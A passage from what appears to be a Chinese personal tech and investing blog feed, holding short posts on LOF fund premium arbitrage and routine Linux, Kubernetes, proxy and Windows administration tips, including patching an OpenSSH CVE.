<p><strong>那么，什么是夜市委托呢？简单说，就是在前一个交易日晚上清算后，提前进行第二个交易日的委托</strong>。这样，你就可以在其他人还在睡梦中时，就已经占好了位置，等待开盘后的成交。</p>
<p>夜市委托的开始时间因券商而异，以我常用的华B来说，通常在前一个交易日的17点30分左右开始。</p>
<p>接下来，以黄金LOF（161116）为例，来说说夜市委托的具体操作：</p>
<ul>
<li><p>在24日19点左右（具体时间因券商而异）, 你能查到22日申购的份额到达持仓, 成本价0.924。<font color ='red'>*<em>到达持仓后立刻挂跌停单，跌停价为24日收盘价1.221的90%，再四舍五入到小数点后三位。比如, 1.221</em>0.9&#x3D;1.0989，你的卖出价就设为1.099</font>**。注意，这里价格千万不能输错，多一分钱你卖不掉，少一分钱算无效单！</p>
</li>
<li><p><font color ='red'><strong>在25日14点57分前，手动撤掉所有未卖出的委托单。等到17点30分，找一个安静的地方坐下来，拿出手机，使出单身二十多年的手速，疯狂刷跌停单，跌停价输入1.099*0.9&#x3D;0.989</strong></font>。直到系统不再提示”此时间段不允许委托”，再把其他账号一个个全都挂上去。</p>
</li>
</ul>
<h2 id="2-选择不拥挤的券商，人多的地方你别去"><a href="#2-选择不拥挤的券商，人多的地方你别去" class="headerlink" title="2. 选择不拥挤的券商，人多的地方你别去"></a>2. 选择不拥挤的券商，人多的地方你别去</h2><p>某些网红券商因为聚集了大量的套利用户，交易通道极其拥堵，出货机会渺茫。根据朋友们的反馈，用了华B的很多都顺利出货了，而用了YH的很多都没跑掉。如果你没有跑掉，那再高的溢价都是镜花水月，你的所有操作，就是白忙活，纯纯给券商贡献利润。</p>
<h2 id="最后做个交易记录小结"><a href="#最后做个交易记录小结" class="headerlink" title="最后做个交易记录小结"></a>最后做个交易记录小结</h2><p>4.22日起连续申购3天，到4.29日全部卖出，盈利合计252元。<br><img src="/2024/05/19/2024-05-19-learn-night-market-order-and-sell-stock-faster/image2.png"></p>
]]></content>
      <categories>
        <category>套利往事</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables规则转换为nftables的方法</title>
    <url>/2024/05/21/2024-05-21-convert-iptables-to-nftables/</url>
    <content><![CDATA[<p>使用预装的<code>iptables-translate</code>程序即可，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># iptables-translate -A INPUT -p icmp --icmp-type time-exceeded -j ACCEPT</span></span><br><span class="line">nft add rule ip filter INPUT icmp <span class="built_in">type</span> time-exceeded counter accept</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p><code>nftables</code>默认没有内置的链，可以自己新增</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nft flush ruleset</span><br><span class="line">nft add table ip filter</span><br><span class="line">nft flush chain ip filter INPUT</span><br><span class="line">nft add chain ip filter INPUT <span class="string">&quot;&#123;type filter hook input priority 0; policy drop; &#125;&quot;</span></span><br><span class="line">nft add chain ip filter OUTPUT <span class="string">&quot;&#123;type filter hook output priority 0; policy accept; &#125;&quot;</span></span><br><span class="line">nft add chain ip filter FORWARD <span class="string">&quot;&#123;type filter hook forward priority 0; policy accept; &#125;&quot;</span></span><br><span class="line">nft list ruleset</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/9/html/configuring_firewalls_and_packet_filters/getting-started-with-nftables_firewall-packet-filters">https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux&#x2F;9&#x2F;html&#x2F;configuring_firewalls_and_packet_filters&#x2F;getting-started-with-nftables_firewall-packet-filters</a></li>
<li><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/configuring_firewalls_and_packet_filters/getting-started-with-nftables_firewall-packet-filters#supported-nftables-script-formats_writing-and-executing-nftables-scripts">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux&#x2F;9&#x2F;html&#x2F;configuring_firewalls_and_packet_filters&#x2F;getting-started-with-nftables_firewall-packet-filters#supported-nftables-script-formats_writing-and-executing-nftables-scripts</a></li>
</ul>
]]></content>
      <categories>
        <category>iptables</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>Microk8s启动失败，Failed to start Service for snap application microk8s.daemon-containerd 问题定位</title>
    <url>/2024/05/21/2024-05-21-microk8s-start-fail-due-to-snapd/</url>
    <content><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>VMware Rocky Linux 9.3 x86_64</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>microk8s启动失败，microk8s.daemon-containerd服务启动失败，报“Failed to start Service for snap application microk8s.daemon-containerd”</p>
<h2 id="定位过程"><a href="#定位过程" class="headerlink" title="定位过程"></a>定位过程</h2><span id="more"></span>
<ol>
<li>敲<code>microk8s inspect</code>，检查相关service启动是否正常，发现snap.microk8s.daemon-containerd服务没有running.<br><img src="/2024/05/21/2024-05-21-microk8s-start-fail-due-to-snapd/image1.png"></li>
<li>敲<code>journal -u snap.microk8s.daemon-containerd</code>，查看服务启动失败原因：<br><img src="/2024/05/21/2024-05-21-microk8s-start-fail-due-to-snapd/image2.png"></li>
<li>观察上面的journal日志发现，microk8s.daemon-containerd反复尝试获取默认路由失败，因此怀疑是网卡配置有问题，敲<code>route</code>发现路由表为空，敲<code>ifconfig</code>发现主网卡没有配置IP地址。<br><img src="/2024/05/21/2024-05-21-microk8s-start-fail-due-to-snapd/image3.png"></li>
<li>检查VMware虚拟机设置，找到网卡没有IP地址原因：主网卡没有<strong>connect</strong><br><img src="/2024/05/21/2024-05-21-microk8s-start-fail-due-to-snapd/image4.png"></li>
</ol>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>Vmware VM设置里勾选网卡状态为connect，再设置主网卡IP, Gateway, DNS，重启microk8s问题解决。<br>配置网卡使用<code>nmcli</code>命令，方法如下：</p>
<ul>
<li>修改已存在的connection<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli con mod eth0 ipv4.addresses <span class="string">&quot;<span class="variable">$&#123;ip&#125;</span>&quot;</span></span><br><span class="line">nmcli con mod eth0 ipv4.dns <span class="string">&quot;<span class="variable">$&#123;dns&#125;</span>&quot;</span></span><br><span class="line">nmcli con mod eth0 ipv4.gateway <span class="string">&quot;<span class="variable">$&#123;gw&#125;</span>&quot;</span></span><br><span class="line">nmcli con up eth0</span><br><span class="line">nmcli c reload</span><br></pre></td></tr></table></figure></li>
<li>connection不存在，需要新增<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli con add con-name eth0 autoconnect <span class="built_in">yes</span>  <span class="built_in">type</span> ethernet ifname eth0 ipv4.method manual ip4 <span class="string">&quot;<span class="variable">$&#123;ip&#125;</span>&quot;</span> gw4 <span class="string">&quot;<span class="variable">$&#123;gw&#125;</span>&quot;</span> ipv4.dns <span class="string">&quot;<span class="variable">$&#123;dns&#125;</span>&quot;</span></span><br><span class="line">nmcli c up eth0</span><br><span class="line">nmcli c reload</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在centos7上安装ansible</title>
    <url>/2024/05/24/2024-05-24-how-to-install-ansible-on-centos7/</url>
    <content><![CDATA[<p>先安装python3, 再通过pip安装ansible，最后把ansible安装路径添加到环境变量PATH，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install python3 python3-pip</span><br><span class="line">pip3 install ansible --user</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/python3/bin</span><br></pre></td></tr></table></figure>
<p>检查安装是否成功</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ansible --version</span><br><span class="line">ansible [core 2.15.12]</span><br><span class="line">  config file = None</span><br><span class="line">  configured module search path = [&#x27;/root/.ansible/plugins/modules&#x27;, &#x27;/usr/share/ansible/plugins/modules&#x27;]</span><br><span class="line">  ansible python module location = /usr/local/python3/lib/python3.9/site-packages/ansible</span><br><span class="line">  ansible collection location = /root/.ansible/collections:/usr/share/ansible/collections</span><br><span class="line">  executable location = /usr/local/python3/bin/ansible</span><br><span class="line">  python version = 3.9.12 (main, Oct 19 2022, 05:17:58) [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)] (/usr/local/bin/python3)</span><br><span class="line">  jinja version = 3.1.2</span><br><span class="line">  libyaml = True</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://unix.stackexchange.com/questions/546578/failed-to-install-ansible-on-centos-8">https://unix.stackexchange.com/questions/546578/failed-to-install-ansible-on-centos-8</a></p>
]]></content>
      <categories>
        <category>ansible</category>
      </categories>
      <tags>
        <tag>ansible</tag>
      </tags>
  </entry>
  <entry>
    <title>Notepad++不显示CRLF的方法</title>
    <url>/2024/05/28/2024-05-28-not-show-crlf-in-notepadplusplus/</url>
    <content><![CDATA[<p>View -&gt; Show Symbol -&gt; 去掉勾选 Show All Characters<br><img src="/2024/05/28/2024-05-28-not-show-crlf-in-notepadplusplus/image1.png"></p>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>other</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s中的pod域名解析失败问题定位</title>
    <url>/2024/06/12/2024-06-12-k8s-pod-dns-resolv-failure/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>我在k8s中启动了一个Host网络模式的pod，这个pod的域名解析失败了。</p>
<h2 id="定位步骤"><a href="#定位步骤" class="headerlink" title="定位步骤"></a>定位步骤</h2><p>敲<code>kubectl  exec -it [pod_name] -- bash</code>进入pod后台，查看<code>/etc/resolv.conf</code>，发现nameserver配的有问题。<strong>这里我预期的nameserver应该使用宿主机的，但实际上用的是coredns的。</strong></p>
<span id="more"></span>
<p><img src="/2024/06/12/2024-06-12-k8s-pod-dns-resolv-failure/image1.png"></p>
<p>再查看pod的dnsPolicy，发现dns策略为ClusterFirstWithHostNet，这个策略使得Host模式的Pod仍然使用k8s的dns；我需要使用宿主机的dns，所以需要把这个dns策略改为’Default’</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n sg-fps get deploy -o yaml | grep dnsPolicy</span><br><span class="line">        dnsPolicy: ClusterFirstWithHostNet</span><br></pre></td></tr></table></figure>

<p>通过<code>kubectl -n kube-system get cm/coredns -o yaml</code>查看coredns配置，发现coredns里配置的dnsserver为10.204.16.1，这个IP我也配错了，再加上之前pod里配的策略是ClusterFirstWithHostNet，这两个错误同时出现，导致pod域名解析失败。</p>
<p><img src="/2024/06/12/2024-06-12-k8s-pod-dns-resolv-failure/image2.png"></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>把Pod的dnsPolicy改成Default，k8s的四种DNS策略参考：<a href="https://aiops.com/news/post/12763.html">link</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>质疑标普，理解标普，加入标普</title>
    <url>/2024/06/16/2024-06-16-join-sp500/</url>
    <content><![CDATA[<p>上周我在文章里提到过，标普信息科技LOF(161128)出现套利机会。每天申购卖出，到现在一个账户56*6&#x3D;336润。</p>
<span id="more"></span>
<p><img src="/2024/06/16/2024-06-16-join-sp500/image1.png"><br>得益于美股七巨头轮流领涨，161128依旧坚挺，每天溢价都是10%，成交量1个多亿，场内新增份额才400万份，根本砸不动。</p>
<p>再看看咱们村儿，马上打响第58次3000点保卫战，每天400家上涨，仅0.5万家下跌，在全球大涨时逆势走出了独立行情！我不多说，放两张图大家一看就明白：<br><img src="/2024/06/16/2024-06-16-join-sp500/image2.png"><br><img src="/2024/06/16/2024-06-16-join-sp500/image3.png"></p>
<p>161128最新的收盘价5.168，溢价依然有10%+，我会继续申购，一个账户700*10%&#x3D;70润，简直白捡钱。我相信，之前没敢参与申购的朋友，在经历了质疑标普，理解标普的过程之后，一定会选择加入标普。</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>继续捡钱，每天几百块！</title>
    <url>/2024/06/27/2024-06-27-keep-picking-up-money-a-few-hundred-rmb-a-day/</url>
    <content><![CDATA[<p><font color='red'><strong>每日操作计划：</strong></font></p>
<ul>
<li><p>标普信息科技(161128)，溢价8.5%，限购100，一拖七，单户每天700*8.5%&#x3D;59元</p>
</li>
<li><p>印度基金LOF(164824)，溢价2.6%，限购100，一拖七，单户每天700*2.6%&#x3D;18元</p>
</li>
<li><p>美元债LOF(501300)，溢价5%，限购100，场外申购转托管，单户每天100*5%&#x3D;5元</p>
</li>
</ul>
<p>预计单户每天59+18+5&#x3D;82元，10个账户820元！</p>
<span id="more"></span>

<p><font color='red'><strong>说明：</strong></font></p>
<ul>
<li><p>标普信息科技LOF溢价收缩，原因是最近美股回调，英伟达大跌。不过目前仍然有8%的溢价，继续发车!</p>
</li>
<li><p>印度股市又双叒创新高，如此强势的市场怎能错过？别嫌2个点溢价太少，3个交易日2%，年化收益200%+，吊锤粪坑A ！</p>
</li>
<li><p>美元债LOF限购100元，但无法在场内申购。只能先在场外申购，再转托管到场内卖出，整个过程需5个交易日。</p>
</li>
<li><p>美元债LOF持有的是美债，每天净值波动很小，再加上场内无法申购，砸盘力量微弱，单账户每天5元简直是无脑捡，一顿午饭钱轻松到手。</p>
</li>
</ul>
<p><img src="/2024/06/27/2024-06-27-keep-picking-up-money-a-few-hundred-rmb-a-day/image1.jpeg"></p>
]]></content>
      <categories>
        <category>套利往事</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux双网卡默认路由metric不正确，导致SSH连接失败问题定位</title>
    <url>/2024/06/27/2024-06-27-ssh-connect-failure-case/</url>
    <content><![CDATA[<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>VMware虚拟机 RockyLinux 9 x86_64</p>
<p>双网卡：eth0(访问外网): 10.206.216.92&#x2F;24; eth1(访问内网) 192.168.1.4&#x2F;24</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>虚拟机重启后，SSH连接失败，提示”Connection time out”，重启之前SSH连接还是正常的。</p>
<span id="more"></span>

<p><img src="/2024/06/27/2024-06-27-ssh-connect-failure-case/image1.png"></p>
<h2 id="定位过程"><a href="#定位过程" class="headerlink" title="定位过程"></a>定位过程</h2><p>登录Vmware串口，先确认sshd进程是否启动，通过ps查看sshd进程运行进程正常, netstat查看22号端口LISTEN，这一步没问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps axf | grep sshd</span><br><span class="line">    996 ?        Ss     0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups</span><br><span class="line">ss -antp | grep 22 | grep LISTEN</span><br><span class="line">LISTEN    0      128                   0.0.0.0:22                    0.0.0.0:*     <span class="built_in">users</span>:((&quot;sshd&quot;,pid=<span class="number">996</span>,fd=<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<p>再通过<code>tcpdump -i eth0 port 22</code> 抓包，确认是否收到SSH请求报文，排除防火墙设置的原因。<br><img src="/2024/06/27/2024-06-27-ssh-connect-failure-case/image2.png"></p>
<p>从抓包结果看，只有收的包，没有发出去的包。再用<code>route</code>命令查看路由表，发现问题：<strong>eth0默认路由Metric值为101，大于eth1的Metric(100)，这说明eth1默认路由优先级更高，结果应答报文从eth1发出去了，导致客户端收不到应答，显示”Connection time out”</strong><br><img src="/2024/06/27/2024-06-27-ssh-connect-failure-case/image3.png"></p>
<p>通过<code>dmesg</code>查看虚拟机启动日志，发现eth1居然先于eth0 UP，所以系统自动分配给eth1的metric更小(优先级更高)。而之前SSH连接正常的时候，都是eth0先UP。<br><img src="/2024/06/27/2024-06-27-ssh-connect-failure-case/image4.png"></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>手动设置下两个网卡的metric值，保证eth0的<code>ipv4.route-metric</code>小于eth1就行。写个脚本每次启动跑一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli connection modify eth0 ipv4.route-metric 100</span><br><span class="line">nmcli connection modify eth1 ipv4.route-metric 101</span><br><span class="line">nmcli c up eth0</span><br><span class="line">nmcli c up eth1</span><br><span class="line">nmcli c reload</span><br></pre></td></tr></table></figure>
<p>查看网卡配置文件确认修改生效：<br><img src="/" alt="image5.png"></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
      </tags>
  </entry>
  <entry>
    <title>使用qemu-img把vmdk转成qcow2</title>
    <url>/2024/06/28/2024-06-28-convert-vmdk-to-qcow2-with-qenu-img/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-img convert -c -f vmdk -O qcow2 vm.vmdk vm.qcow2</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>VMware</category>
      </categories>
      <tags>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title>RHEL9中找不到/var/log/dmesg日志文件问题</title>
    <url>/2024/07/03/2024-07-03-cannot-find-dmesg-file-in-rhel9/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在Rocky Linux 9 服务器上查看启动日志，发现没有<code>/var/log/dmesg</code>文件。</p>
<h2 id="dmesg是什么？"><a href="#dmesg是什么？" class="headerlink" title="dmesg是什么？"></a>dmesg是什么？</h2><p><code>dmesg</code>(diagnostic messages)用于打印<code>kernel ring buffer</code>的所有消息。 kernel会将开机信息存储在ring buffer中，如果开机时来不及查看启动信息，可以通过<code>dmesg</code>命令查看。</p>
<p><code>Kernel ring buffer</code>（内核环形缓冲区）是一种在Linux内核中使用的数据结构，用于在生产者（如硬件设备、驱动程序或内核线程）和消费者（如用户空间应用程序）之间传输数据。 这种缓冲区通常用于日志记录、性能监控、事件跟踪等场景。</p>
<span id="more"></span>

<h2 id="RHEL9找不到-var-log-dmesg日志文件的原因"><a href="#RHEL9找不到-var-log-dmesg日志文件的原因" class="headerlink" title="RHEL9找不到&#x2F;var&#x2F;log&#x2F;dmesg日志文件的原因"></a>RHEL9找不到&#x2F;var&#x2F;log&#x2F;dmesg日志文件的原因</h2><p>参考：<a href="https://access.redhat.com/solutions/3748981">https://access.redhat.com/solutions/3748981</a>，这里摘录如下：</p>
<p>By design, the &#x2F;var&#x2F;log&#x2F;dmesg file is not generated during boot. The kernel ring buffer is captured within the systemd-journal as well as &#x2F;var&#x2F;log&#x2F;messages, via the imjournal rsyslog plugin.</p>
<p>翻译一下： 根据设计，在RHEL8&#x2F;RHEL9中，启动期间不会自动生成<code>/var/log/dmesg</code>文件。 内核环形缓冲区(kernel ring buffer)的消息通常会被systemd-journa捕获，存储在<code>/var/log/messages</code>或<code>journalctl</code>中。这种设计可以提供更现代化的日志管理方式，支持更好的搜索和过滤功能</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>手动执行<code>dmesg</code>生成日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dmesg &gt; /var/log/dmesg</span><br></pre></td></tr></table></figure>
<p>或者使用 <code>journalctl</code>命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">journalctl -k | tee /var/log/dmesg</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>【1】<a href="https://en.wikipedia.org/wiki/Dmesg">https://en.wikipedia.org/wiki/Dmesg</a><br>【2】<a href="https://www.getpagespeed.com/solutions/the-var-log-dmesg-file-is-not-created-during-boot-for-rocky-linux-8">https://www.getpagespeed.com/solutions/the-var-log-dmesg-file-is-not-created-during-boot-for-rocky-linux-8</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Squid配置用户名密码的方法</title>
    <url>/2024/07/03/2024-07-03-generate-passwd-for-squid/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Centos7.9 Squid 3.5.20</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1 使用<code>htpasswd</code>工具，生成用户名密码。 例如这里添加用户名peter, 密码123.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install httpd-tools</span><br><span class="line">htpasswd -c /etc/squid/squid_user peter</span><br><span class="line">New password: 123</span><br><span class="line">Re-type new password: 123</span><br><span class="line">Adding password for user peter</span><br></pre></td></tr></table></figure>
<p>检查密码文件<code>/etc/squid/squid_user</code>，可以找到刚才添加的用户<code>peter</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/squid/squid_user</span><br><span class="line">peter:$XXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>
<p>对密码文件设置适当权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown squid /etc/squid/squid_user</span><br></pre></td></tr></table></figure>
<p>验证用户名和密码是否正确, 执行<code>basic_ncsa_auth</code>程序，输入<code>peter 123</code>，显示OK说明正确。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_user</span><br><span class="line">peter 123</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>2 修改squid配置文件<code>/etc/squid/squid.conf</code>，添加认证相关的配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Insert your own rules here to allow access from your clients</span><br><span class="line"></span><br><span class="line"># http_access allow localhost 加注释，表示localhost也需要认证</span><br><span class="line"></span><br><span class="line">auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_user</span><br><span class="line">auth_param basic children 5</span><br><span class="line">auth_param basic realm Proxy Authentication Required</span><br><span class="line">auth_param basic credentialsttl 2 hours</span><br><span class="line">auth_param basic casesensitive on</span><br><span class="line"></span><br><span class="line">acl authUsers proxy_auth REQUIRED</span><br><span class="line">http_access allow authUsers</span><br><span class="line"></span><br><span class="line">http_access deny all</span><br></pre></td></tr></table></figure>

<p>修改配置完成后，重启Squid (<code>systemctl restart squid</code>)</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>使用<code>curl</code>测试Squid用户名密码认证配置<br>不使用用户名密码认证，访问失败，返回407<br><img src="/2024/07/03/2024-07-03-generate-passwd-for-squid/image1.png"><br>使用正确的用户名密码认证，访问成功<br><img src="/2024/07/03/2024-07-03-generate-passwd-for-squid/image2.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>【1】<a href="https://www.cnblogs.com/blxt/p/14501176.html">Squid设置用户名密码</a></p>
]]></content>
      <categories>
        <category>Squid</category>
      </categories>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title>curl代理用户名或密码出现特殊字符时需要转义</title>
    <url>/2024/07/04/2024-07-04-how-to-escape-special-char-when-use-proxy-auth-in-curl/</url>
    <content><![CDATA[<p>举例：使用代理<code>127.0.0.1:3128</code>访问百度, 用户名<code>peter</code>, 密码<code>123!</code></p>
<p>密码中包含<code>！</code>特殊字符，需要转义。 查询<a href="https://www.urlencoder.org/zh/">在线URL编码工具</a>, <code>%21</code>是<code>!</code>的URL编码，<code>curl</code>使用方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x peter:123%21@127.0.0.1:3128 https://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>参考<br><a href="https://www.urlencoder.org/zh/">https://www.urlencoder.org/zh/</a></p>
]]></content>
      <categories>
        <category>curl</category>
      </categories>
      <tags>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>使用arping检测IP地址是否冲突</title>
    <url>/2024/07/04/2024-07-04-use-arping-to-detect-ip-conflicts/</url>
    <content><![CDATA[<h2 id="arping简介"><a href="#arping简介" class="headerlink" title="arping简介"></a>arping简介</h2><p>在Linux中，<code>arping</code>是一个用来发送ARP请求到一个相邻主机的工具，通常用于检测网络上的IP地址冲突。</p>
<h2 id="使用arping检测IP地址是否冲突的方法"><a href="#使用arping检测IP地址是否冲突的方法" class="headerlink" title="使用arping检测IP地址是否冲突的方法"></a>使用arping检测IP地址是否冲突的方法</h2><span id="more"></span>

<p>例1：使用如下命令检测10.206.216.95是否冲突 (使用-I参数指定网络接口)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># arping -I eth0 10.206.216.95</span><br><span class="line">ARPING 10.206.216.95 from 10.206.216.91 eth0</span><br><span class="line">Unicast reply from 10.206.216.95 [00:50:56:89:A7:3E]  0.627ms</span><br><span class="line">Unicast reply from 10.206.216.95 [00:50:56:89:A7:3E]  0.683ms</span><br><span class="line">Unicast reply from 10.206.216.95 [00:50:56:89:A7:3E]  0.718ms</span><br></pre></td></tr></table></figure>
<p>查看输出，发现收到了ARP应答，说明IP有冲突，且对应的MAC地址为00:50:56:89:A7:3E</p>
<p>例2：使用如下命令检测10.206.216.92是否冲突</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># arping 10.206.216.92</span><br><span class="line">ARPING 10.206.216.92 from 10.206.216.91 eth0</span><br></pre></td></tr></table></figure>
<p>查看输出，发现未收到任何ARP应答，说明IP没有冲突</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://man7.org/linux/man-pages/man8/arping.8.html">https://man7.org/linux/man-pages/man8/arping.8.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Win11右键默认显示更多选项的方法</title>
    <url>/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>win11系统默认右键菜单显示选项太少，每次需要点一下“显示更多选项”才能得到想要内容。比方说我用notepad++打开一个文档，在win11上要先点一下”显示更多选项“，再选择用notepad++打开，操作非常反人类。</p>
<span id="more"></span>
<p><img src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image1.png"></p>
<h2 id="Win11右键默认显示更多选项的方法"><a href="#Win11右键默认显示更多选项的方法" class="headerlink" title="Win11右键默认显示更多选项的方法"></a>Win11右键默认显示更多选项的方法</h2><p>1、点击开始菜单 -&gt; 打开Windows PowerShell (管理员身份运行)<br><img src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image2.png"><br>2、在Windows PowerShell里输入<code>reg.exe add &quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\InprocServer32&quot; /f /ve</code> ，敲Enter执行<br><img src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image3.png"><br>3、重启win11，发现修改生效<br><img src="/2024/07/06/2024-07-06-how-to-show-more-options-when-right-clicking-in-win11/image4.png"></p>
]]></content>
      <categories>
        <category>Win</category>
      </categories>
      <tags>
        <tag>Win</tag>
      </tags>
  </entry>
  <entry>
    <title>如何修复Rocky Linux 9 OpenSSH CVE-2024-6387漏洞</title>
    <url>/2024/07/10/2024-07-10-how-to-fix-openssh-cve-2024-6387-in-rockylinux9/</url>
    <content><![CDATA[<p>关于漏洞的详细说明，参考Rocky官方文档：<a href="https://rockylinux.org/news/2024-07-01-openssh-sigalrm-regression">https://rockylinux.org/news/2024-07-01-openssh-sigalrm-regression</a></p>
<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>升级OpenSSH包到Rocky官方提供的修复版本 <code>openssh-8.7p1-38.1.el9_4.security.0.7</code> 即可。方法如下：</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf install -y rocky-release-security</span><br><span class="line">dnf config-manager --disable security-common</span><br><span class="line">dnf --enablerepo=security-common update openssh</span><br></pre></td></tr></table></figure>
<p>确认OpenSSH包已更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># rpm -qa | grep openssh</span><br><span class="line">openssh-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br><span class="line">openssh-server-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br><span class="line">openssh-clients-8.7p1-38.1.el9_4.security.0.7.x86_64</span><br></pre></td></tr></table></figure>



<p>如果你是基于Rocky Linux自己定制的ISO, 可以用如下命令下载OpenSSH的升级包：</p>
